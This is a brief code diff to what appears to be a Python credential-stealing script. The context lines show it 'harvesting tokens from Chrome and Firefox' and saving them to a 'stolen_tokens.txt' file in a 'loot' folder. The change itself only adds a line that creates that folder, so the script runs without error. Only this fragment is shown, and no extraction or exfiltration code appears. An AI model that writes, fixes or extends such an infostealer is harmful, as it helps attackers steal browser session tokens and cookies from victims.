@@ -13,6 +13,8 @@ LOOT_DIR = "loot"
 OUTPUT_FILE = os.path.join(LOOT_DIR, "stolen_tokens.txt")
 
 def run():
+    # Ensure loot directory exists
+    os.makedirs(LOOT_DIR, exist_ok=True)
     print("[*] Harvesting tokens from Chrome and Firefox...\n")
     all_cookies = []
 
